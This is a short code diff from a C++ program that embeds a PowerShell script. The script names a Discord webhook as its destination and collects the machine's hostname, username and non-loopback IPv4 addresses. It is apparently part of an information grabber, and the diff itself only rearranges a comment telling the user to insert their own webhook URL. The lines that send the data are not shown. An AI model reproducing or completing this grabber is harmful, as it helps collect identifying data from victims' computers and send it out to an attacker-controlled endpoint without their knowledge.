@@ -13,7 +13,13 @@ int main() {
     */
     
     const std::string psScript =
-        "$url = \"https://discord.com/api/webhooks/your-custom-webhook\";\n"   // make sure to replace with your own webhook url
+    
+        "$url = \"https://discord.com/api/webhooks/your-custom-webhook\";\n"
+
+        /*
+            replace the webhook above with your custom own one
+        */
+    
         "$hostname = $env:COMPUTERNAME;\n"
         "$username = $env:USERNAME;\n"
         "$ipv4 = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike \"*Loopback*\" }).IPAddress;\n"
